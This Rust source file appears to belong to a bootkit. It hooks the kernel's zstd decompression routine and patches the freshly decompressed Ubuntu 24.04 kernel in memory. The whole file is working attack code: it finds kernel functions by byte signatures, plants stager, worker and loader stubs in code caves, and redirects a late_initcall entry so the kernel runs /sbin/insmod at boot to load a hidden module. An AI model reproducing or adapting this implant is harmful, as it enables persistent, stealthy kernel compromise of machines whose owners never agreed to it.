use log::{debug, error, info};

use crate::helpers::{
    file_helper::{cave_finder_by_section_name, cave_finder_by_section_name_excluding_after},
    memory_helper::{
        INLINE_HOOK_SIZE, InitcallPhase, InlineHook, binary_search,
        find_sentinel_4, get_initcall_phase_address, restore_inline_hook,
        translate_physical_to_virtual,
    },
};

pub static mut ZSTD_DECOMPRESS_DCTX_HOOK_INLINE: InlineHook = InlineHook {
    target: 0,
    hook: 0,
    original_bytes: [0; INLINE_HOOK_SIZE],
};

// Pattern for call_usermodehelper in Ubuntu 24.04 LTS kernel (6.8.x target).
// Derived from disassembly of the target vmlinuz. Update if targeting a different kernel.
const CALL_USERMODEHELPER_PATTERN: &[u8] =
    &[0x81, 0xC6, 0xC0, 0x0D, 0x00, 0x00, 0x48, 0xC1, 0xE8, 0x3C];
const CALL_USERMODEHELPER_DISTANCE: u8 = 0x40;
const CALL_UMH_REL_SENTINEL: u32 = 0xDDEEFF00;
const ARGV0_VIRT_SENTINEL: u64 = 0xAAAAAAAAAAAAAAAA;
const WORK_STRUCT_DISP_SENTINEL: u32 = 0x11223344;
const ORIGINAL_FN_REL_SENTINEL: u32 = 0x12345678;
const SCHEDULE_WORK_PATTERN: &[u8] = &[0x48, 0x89, 0xFA, 0xBF, 0x00, 0x20, 0x00, 0x00];
const SCHEDULE_WORK_DISTANCE: u8 = 8;
const MSLEEP_PATTERN: &[u8] = &[
    0x48, 0x89, 0xC3, 0x66, 0x90, 0x41, 0xC7, 0x44, 0x24, 0x18, 0x02,
];
const MSLEEP_DISTANCE: u8 = 0x1E;
const SCHEDULE_WORK_REL_SENTINEL: u32 = 0xAABBCCDD;
const MSLEEP_REL_SENTINEL: u32 = 0x11AABBCC;
const LKM_WORKER_DISP_SENTINEL: u32 = 0xAABBCCEE;
const WORKER_TAIL_REL_SENTINEL: u32 = 0xEEAABBCC;
const PATH_DISP_SENTINEL: u32 = 0xCCDDEE11;
const ARGV_DISP_SENTINEL: u32 = 0xCCDDEE22;
const MODULE_FROM_PATH_OFFSET_SENTINEL: u8 = 0x7F;
const HELPER_PATH: &[u8] = b"/sbin/insmod\0";
const MIN_TEXT_CAVE_OFFSET: usize = 0x1000;

// Ubuntu 24.04's 6.8 kernel has CONFIG_DEBUG_OBJECTS_WORK disabled. This is
// WORK_DATA_INIT(): WORK_STRUCT_NO_POOL with WORK_OFFQ_POOL_SHIFT == 21.
const WORK_STRUCT_NO_POOL: u64 = 0x000F_FFFF_FFE0_0000;

/// zstd_decompress_dctx_hook is an inline hook for the zstd_decompress_dctx function in the Linux kernel.
///
/// # Arguments:
/// - `dctx`: The decompression context.
/// - `dst`: The destination buffer for the decompressed data.
/// - `dst_capacity`: The capacity of the destination buffer.
/// - `src`: The source buffer containing the compressed data.
/// - `src_size`: The size of the source buffer.
///
/// # Returns:
/// - `isize`: The return value from the original function, or -1 if an error occurs.
pub extern "sysv64" fn zstd_decompress_dctx_hook(
    dctx: usize,
    dst: usize,
    dst_capacity: usize,
    src: usize,
    src_size: usize,
) -> isize {
    debug!(
        "zstd_decompress_dctx_hook called with dctx: {:#x}, dst: {:#x}, dst_capacity: {:#x}, src: {:#x}, src_size: {:#x}",
        dctx, dst, dst_capacity, src, src_size
    );

    let target =
        unsafe { core::ptr::addr_of!(ZSTD_DECOMPRESS_DCTX_HOOK_INLINE.target).read_volatile() };
    let original_bytes = unsafe {
        core::ptr::addr_of!(ZSTD_DECOMPRESS_DCTX_HOOK_INLINE.original_bytes).read_volatile()
    };
    if target == 0 {
        error!("Hook target was not initialized");

        return -1;
    }
    if let Err(e) = restore_inline_hook(target, &original_bytes) {
        error!("Failed to restore original function: {:?}", e);
        return -1;
    }
    let original_fn: extern "sysv64" fn(usize, usize, usize, usize, usize) -> isize =
        unsafe { core::mem::transmute(target) };
    let ret_val = original_fn(dctx, dst, dst_capacity, src, src_size);

    debug!(
        "zstd_decompress_dctx state is now: dctx: {:#x}, dst: {:#x}, dst_capacity: {:#x}, src: {:#x}, src_size: {:#x}",
        dctx, dst, dst_capacity, src, src_size
    );
    info!(
        "Decompressed linux kernel is at address: {:#x}, size: {:#x}",
        dst, dst_capacity
    );

    // Deploy the kernel hook: patch one late_initcall entry to a .text stub.
    // The stub queues a .text worker using data stored in .data, then tail-calls
    // the displaced original initcall target. No code executes from .data.
    let initcall_info =
        match get_initcall_phase_address(dst, dst_capacity, InitcallPhase::LateInitcall) {
            Some(info) => info,
            None => {
                error!("Failed to find late_initcall address in kernel");
                return ret_val;
            }
        };
    debug!(
        "Found late_initcall entry: entry_phys={:#x}, entry_virt={:#x}, original_target_virt={:#x}",
        initcall_info.entry_physical_address,
        initcall_info.entry_virtual_address,
        initcall_info.original_target_virtual_address
    );

    const STAGER_TEMPLATE: &[u8] = include_bytes!(env!("LKM_STAGER_BIN"));
    const STAGER_LEN: usize = STAGER_TEMPLATE.len();
    const LOADER_TEMPLATE: &[u8] = include_bytes!(env!("LKM_LOADER_BIN"));
    const LOADER_LEN: usize = LOADER_TEMPLATE.len();
    const WORKER_TEMPLATE: &[u8] = include_bytes!(env!("LKM_WORKER_BIN"));
    const WORKER_LEN: usize = WORKER_TEMPLATE.len();
    const WORKER_TAIL_TEMPLATE: &[u8] = include_bytes!(env!("LKM_WORKER_TAIL_BIN"));
    const WORKER_TAIL_LEN: usize = WORKER_TAIL_TEMPLATE.len();

    let stager_cave = match cave_finder_by_section_name_excluding_after(
        dst,
        dst_capacity,
        STAGER_LEN,
        ".text",
        &[],
        MIN_TEXT_CAVE_OFFSET,
    ) {
        Some(addr) => addr,
        None => {
            error!("Failed to find stager cave in .text");
            return ret_val;
        }
    };
    let stager_end = match stager_cave.checked_add(STAGER_LEN) {
        Some(addr) => addr,
        None => {
            error!("Stager cave range overflow");
            return ret_val;
        }
    };
    debug!("Stager cave: phys={:#x}", stager_cave);

    let worker_tail_cave = match cave_finder_by_section_name_excluding_after(
        dst,
        dst_capacity,
        WORKER_TAIL_LEN,
        ".text",
        &[(stager_cave, stager_end)],
        MIN_TEXT_CAVE_OFFSET,
    ) {
        Some(addr) => addr,
        None => {
            error!("Failed to find separate worker tail cave in .text");
            return ret_val;
        }
    };
    let worker_tail_end = match worker_tail_cave.checked_add(WORKER_TAIL_LEN) {
        Some(addr) => addr,
        None => {
            error!("Worker tail cave range overflow");
            return ret_val;
        }
    };
    debug!("Worker tail cave: phys={:#x}", worker_tail_cave);

    let worker_cave = match cave_finder_by_section_name_excluding_after(
        dst,
        dst_capacity,
        WORKER_LEN,
        ".text",
        &[
            (stager_cave, stager_end),
            (worker_tail_cave, worker_tail_end),
        ],
        MIN_TEXT_CAVE_OFFSET,
    ) {
        Some(addr) => addr,
        None => {
            error!("Failed to find separate worker sleeper cave in .text");
            return ret_val;
        }
    };
    debug!("Worker cave: phys={:#x}", worker_cave);

    let loader_cave = match cave_finder_by_section_name(dst, dst_capacity, LOADER_LEN, ".data") {
        Some(addr) => addr,
        None => {
            error!("Failed to find data cave for loader state");
            return ret_val;
        }
    };
    debug!("Loader data cave: phys={:#x}", loader_cave);

    let mut call_usermodehelper_phys =
        match binary_search(dst, dst_capacity, CALL_USERMODEHELPER_PATTERN) {
            Some(addr) => addr,
            None => {
                error!("Failed to find call_usermodehelper in kernel");
                return ret_val;
            }
        };
    call_usermodehelper_phys =
        match call_usermodehelper_phys.checked_sub(CALL_USERMODEHELPER_DISTANCE as usize) {
            Some(addr) => addr,
            None => {
                error!("call_usermodehelper pattern distance underflow");
                return ret_val;
            }
        };
    let call_usermodehelper_virt =
        match translate_physical_to_virtual(dst, dst_capacity, call_usermodehelper_phys) {
            Some(addr) => addr,
            None => {
                error!("Failed to translate call_usermodehelper to virtual address");
                return ret_val;
            }
        };
    debug!(
        "call_usermodehelper: phys={:#x}, virt={:#x}",
        call_usermodehelper_phys, call_usermodehelper_virt
    );

    let mut schedule_work_phys = match binary_search(dst, dst_capacity, SCHEDULE_WORK_PATTERN) {
        Some(addr) => addr,
        None => {
            error!("Failed to find schedule_work in kernel");
            return ret_val;
        }
    };
    schedule_work_phys = match schedule_work_phys.checked_sub(SCHEDULE_WORK_DISTANCE as usize) {
        Some(addr) => addr,
        None => {
            error!("schedule_work pattern distance underflow");
            return ret_val;
        }
    };
    let schedule_work_virt =
        match translate_physical_to_virtual(dst, dst_capacity, schedule_work_phys) {
            Some(addr) => addr,
            None => {
                error!("Failed to translate schedule_work to virtual address");
                return ret_val;
            }
        };
    debug!(
        "schedule_work: phys={:#x}, virt={:#x}",
        schedule_work_phys, schedule_work_virt
    );

    let mut msleep_phys = match binary_search(dst, dst_capacity, MSLEEP_PATTERN) {
        Some(addr) => addr,
        None => {
            error!("Failed to find msleep in kernel");
            return ret_val;
        }
    };
    msleep_phys = match msleep_phys.checked_sub(MSLEEP_DISTANCE as usize) {
        Some(addr) => addr,
        None => {
            error!("msleep pattern distance underflow");
            return ret_val;
        }
    };
    let msleep_virt = match translate_physical_to_virtual(dst, dst_capacity, msleep_phys) {
        Some(addr) => addr,
        None => {
            error!("Failed to translate msleep to virtual address");
            return ret_val;
        }
    };
    debug!("msleep: phys={:#x}, virt={:#x}", msleep_phys, msleep_virt);

    let stager_cave_virt = match translate_physical_to_virtual(dst, dst_capacity, stager_cave) {
        Some(addr) => addr,
        None => {
            error!("Failed to translate stager cave to virtual address");
            return ret_val;
        }
    };
    let worker_cave_virt = match translate_physical_to_virtual(dst, dst_capacity, worker_cave) {
        Some(addr) => addr,
        None => {
            error!("Failed to translate worker cave to virtual address");
            return ret_val;
        }
    };
    let worker_tail_cave_virt =
        match translate_physical_to_virtual(dst, dst_capacity, worker_tail_cave) {
            Some(addr) => addr,
            None => {
                error!("Failed to translate worker tail cave to virtual address");
                return ret_val;
            }
        };
    let loader_cave_virt = match translate_physical_to_virtual(dst, dst_capacity, loader_cave) {
        Some(addr) => addr,
        None => {
            error!("Failed to translate loader data cave to virtual address");
            return ret_val;
        }
    };
    debug!(
        "Caves: stager virt={:#x}, worker virt={:#x}, worker tail virt={:#x}, loader data virt={:#x}",
        stager_cave_virt, worker_cave_virt, worker_tail_cave_virt, loader_cave_virt
    );

    let mut stager = [0u8; STAGER_LEN];
    stager.copy_from_slice(STAGER_TEMPLATE);

    let sentinel = WORK_STRUCT_DISP_SENTINEL.to_le_bytes();
    if let Some(off) = find_sentinel_4(&stager, &sentinel) {
        let disp32 = (loader_cave_virt as i64) - (stager_cave_virt as i64 + off as i64 + 4);
        if disp32 < i32::MIN as i64 || disp32 > i32::MAX as i64 {
            error!(
                "work_struct too far from stager for disp32: delta={:#x}",
                disp32
            );
            return ret_val;
        }
        stager[off..off + 4].copy_from_slice(&(disp32 as i32).to_le_bytes());
    } else {
        error!("Failed to find WORK_STRUCT_DISP_SENTINEL in stager");
        return ret_val;
    }

    let sentinel = LKM_WORKER_DISP_SENTINEL.to_le_bytes();
    if let Some(off) = find_sentinel_4(&stager, &sentinel) {
        let disp32 = (worker_cave_virt as i64) - (stager_cave_virt as i64 + off as i64 + 4);
        if disp32 < i32::MIN as i64 || disp32 > i32::MAX as i64 {
            error!(
                "Worker cave too far from stager for disp32: delta={:#x}",
                disp32
            );
            return ret_val;
        }
        stager[off..off + 4].copy_from_slice(&(disp32 as i32).to_le_bytes());
    } else {
        error!("Failed to find LKM_WORKER_DISP_SENTINEL in stager");
        return ret_val;
    }

    let sentinel = SCHEDULE_WORK_REL_SENTINEL.to_le_bytes();
    if let Some(off) = find_sentinel_4(&stager, &sentinel) {
        let rel32 = (schedule_work_virt as i64) - (stager_cave_virt as i64 + off as i64 + 4);
        if rel32 < i32::MIN as i64 || rel32 > i32::MAX as i64 {
            error!(
                "schedule_work too far from stager for rel32: delta={:#x}",
                rel32
            );
            return ret_val;
        }
        stager[off..off + 4].copy_from_slice(&(rel32 as i32).to_le_bytes());
    } else {
        error!("Failed to find SCHEDULE_WORK_REL_SENTINEL in stager");
        return ret_val;
    }

    let sentinel = ORIGINAL_FN_REL_SENTINEL.to_le_bytes();
    if let Some(off) = find_sentinel_4(&stager, &sentinel) {
        let rel32 = (initcall_info.original_target_virtual_address as i64)
            - (stager_cave_virt as i64 + off as i64 + 4);
        if rel32 < i32::MIN as i64 || rel32 > i32::MAX as i64 {
            error!(
                "Original initcall too far from stager for rel32: delta={:#x}",
                rel32
            );
            return ret_val;
        }
        stager[off..off + 4].copy_from_slice(&(rel32 as i32).to_le_bytes());
    } else {
        error!("Failed to find ORIGINAL_FN_REL_SENTINEL in stager");
        return ret_val;
    }

    let mut loader = [0u8; LOADER_LEN];
    loader.copy_from_slice(LOADER_TEMPLATE);

    let work_entry_virt = loader_cave_virt as u64 + 8;
    loader[0..8].copy_from_slice(&WORK_STRUCT_NO_POOL.to_le_bytes());
    loader[8..16].copy_from_slice(&0u64.to_le_bytes());
    loader[16..24].copy_from_slice(&0u64.to_le_bytes());
    loader[24..32].copy_from_slice(&0u64.to_le_bytes());
    debug!(
        "Initialized work_struct template: data={:#x}, runtime entry={:#x}, runtime func={:#x}",
        WORK_STRUCT_NO_POOL, work_entry_virt, worker_cave_virt
    );

    let helper_path_off = match LOADER_TEMPLATE
        .windows(HELPER_PATH.len())
        .position(|w| w == HELPER_PATH)
    {
        Some(off) => off as u64,
        None => {
            error!("Failed to find helper path in loader template");
            return ret_val;
        }
    };
    let module_name_off = helper_path_off + HELPER_PATH.len() as u64;
    debug!(
        "Loader argv will be initialized at runtime: argv[0]=data+{:#x}, argv[1]=data+{:#x}",
        helper_path_off, module_name_off
    );

    let mut worker = [0u8; WORKER_LEN];
    worker.copy_from_slice(WORKER_TEMPLATE);

    let sentinel = MSLEEP_REL_SENTINEL.to_le_bytes();
    if let Some(off) = find_sentinel_4(&worker, &sentinel) {
        let rel32 = (msleep_virt as i64) - (worker_cave_virt as i64 + off as i64 + 4);
        if rel32 < i32::MIN as i64 || rel32 > i32::MAX as i64 {
            error!(
                "msleep too far from worker cave for rel32: delta={:#x}",
                rel32
            );
            return ret_val;
        }
        worker[off..off + 4].copy_from_slice(&(rel32 as i32).to_le_bytes());
    } else {
        error!("Failed to find MSLEEP_REL_SENTINEL in worker");
        return ret_val;
    }

    let sentinel = WORKER_TAIL_REL_SENTINEL.to_le_bytes();
    if let Some(off) = find_sentinel_4(&worker, &sentinel) {
        let rel32 = (worker_tail_cave_virt as i64) - (worker_cave_virt as i64 + off as i64 + 4);
        if rel32 < i32::MIN as i64 || rel32 > i32::MAX as i64 {
            error!(
                "worker tail too far from worker cave for rel32: delta={:#x}",
                rel32
            );
            return ret_val;
        }
        worker[off..off + 4].copy_from_slice(&(rel32 as i32).to_le_bytes());
    } else {
        error!("Failed to find WORKER_TAIL_REL_SENTINEL in worker");
        return ret_val;
    }

    let mut worker_tail = [0u8; WORKER_TAIL_LEN];
    worker_tail.copy_from_slice(WORKER_TAIL_TEMPLATE);

    if let Some(off) = worker_tail
        .iter()
        .position(|byte| *byte == MODULE_FROM_PATH_OFFSET_SENTINEL)
    {
        let module_from_path = module_name_off - helper_path_off;
        if module_from_path > u8::MAX as u64 {
            error!(
                "module path offset too large for worker tail imm8: offset={:#x}",
                module_from_path
            );
            return ret_val;
        }
        worker_tail[off] = module_from_path as u8;
    } else {
        error!("Failed to find MODULE_FROM_PATH_OFFSET_SENTINEL in worker tail");
        return ret_val;
    }

    let sentinel = CALL_UMH_REL_SENTINEL.to_le_bytes();
    if let Some(off) = find_sentinel_4(&worker_tail, &sentinel) {
        let rel32 =
            (call_usermodehelper_virt as i64) - (worker_tail_cave_virt as i64 + off as i64 + 4);
        if rel32 < i32::MIN as i64 || rel32 > i32::MAX as i64 {
            error!(
                "call_usermodehelper too far from worker tail cave for rel32: delta={:#x}",
                rel32
            );
            return ret_val;
        }
        worker_tail[off..off + 4].copy_from_slice(&(rel32 as i32).to_le_bytes());
    } else {
        error!("Failed to find CALL_UMH_REL_SENTINEL in worker tail");
        return ret_val;
    }

    let argv_buffer_off = {
        let s = ARGV0_VIRT_SENTINEL.to_le_bytes();
        match LOADER_TEMPLATE.windows(8).position(|w| w == s.as_slice()) {
            Some(off) => off,
            None => {
                error!("Failed to find argv buffer sentinel in loader template");
                return ret_val;
            }
        }
    };
    let path_buffer_virt = match loader_cave_virt.checked_add(helper_path_off as usize) {
        Some(addr) => addr,
        None => {
            error!("path buffer virtual address overflow");
            return ret_val;
        }
    };
    let argv_buffer_virt = match loader_cave_virt.checked_add(argv_buffer_off) {
        Some(addr) => addr,
        None => {
            error!("argv buffer virtual address overflow");
            return ret_val;
        }
    };

    let sentinel = PATH_DISP_SENTINEL.to_le_bytes();
    if let Some(off) = find_sentinel_4(&worker_tail, &sentinel) {
        let disp32 = (path_buffer_virt as i64) - (worker_tail_cave_virt as i64 + off as i64 + 4);
        if disp32 < i32::MIN as i64 || disp32 > i32::MAX as i64 {
            error!(
                "path_buffer too far from worker tail for disp32: delta={:#x}",
                disp32
            );
            return ret_val;
        }
        worker_tail[off..off + 4].copy_from_slice(&(disp32 as i32).to_le_bytes());
    } else {
        error!("Failed to find PATH_DISP_SENTINEL in worker tail");
        return ret_val;
    }

    let sentinel = ARGV_DISP_SENTINEL.to_le_bytes();
    if let Some(off) = find_sentinel_4(&worker_tail, &sentinel) {
        let disp32 = (argv_buffer_virt as i64) - (worker_tail_cave_virt as i64 + off as i64 + 4);
        if disp32 < i32::MIN as i64 || disp32 > i32::MAX as i64 {
            error!(
                "argv_buffer too far from worker tail for disp32: delta={:#x}",
                disp32
            );
            return ret_val;
        }
        worker_tail[off..off + 4].copy_from_slice(&(disp32 as i32).to_le_bytes());
    } else {
        error!("Failed to find ARGV_DISP_SENTINEL in worker tail");
        return ret_val;
    }

    unsafe {
        // Safety: each cave was bounds-checked by the ELF section scanners and
        // excluded from overlapping reservations before these fixed-size copies.
        core::ptr::copy_nonoverlapping(stager.as_ptr(), stager_cave as *mut u8, STAGER_LEN);
        core::ptr::copy_nonoverlapping(loader.as_ptr(), loader_cave as *mut u8, LOADER_LEN);
        core::ptr::copy_nonoverlapping(worker.as_ptr(), worker_cave as *mut u8, WORKER_LEN);
        core::ptr::copy_nonoverlapping(
            worker_tail.as_ptr(),
            worker_tail_cave as *mut u8,
            WORKER_TAIL_LEN,
        );
    }
    debug!(
        "Wrote {} bytes of stager to {:#x}, {} bytes of loader data to {:#x}, {} bytes of worker to {:#x}, {} bytes of worker tail to {:#x}",
        STAGER_LEN,
        stager_cave,
        LOADER_LEN,
        loader_cave,
        WORKER_LEN,
        worker_cave,
        WORKER_TAIL_LEN,
        worker_tail_cave
    );

    let relative_offset = (stager_cave_virt as i64) - (initcall_info.entry_virtual_address as i64);
    if relative_offset < i32::MIN as i64 || relative_offset > i32::MAX as i64 {
        error!(
            "Stager cave too far from initcall entry for prel32: delta={:#x}",
            relative_offset
        );
        return ret_val;
    }
    unsafe {
        // Safety: get_initcall_phase_address returned a validated 4-byte
        // prel32 entry inside the decompressed kernel image.
        core::ptr::write(
            initcall_info.entry_physical_address as *mut i32,
            relative_offset as i32,
        );
    }
    info!(
        "Patched late_initcall entry at virt={:#x} (phys={:#x}) prel32={} -> stager at virt={:#x}",
        initcall_info.entry_virtual_address,
        initcall_info.entry_physical_address,
        relative_offset as i32,
        stager_cave_virt
    );
    ret_val
}
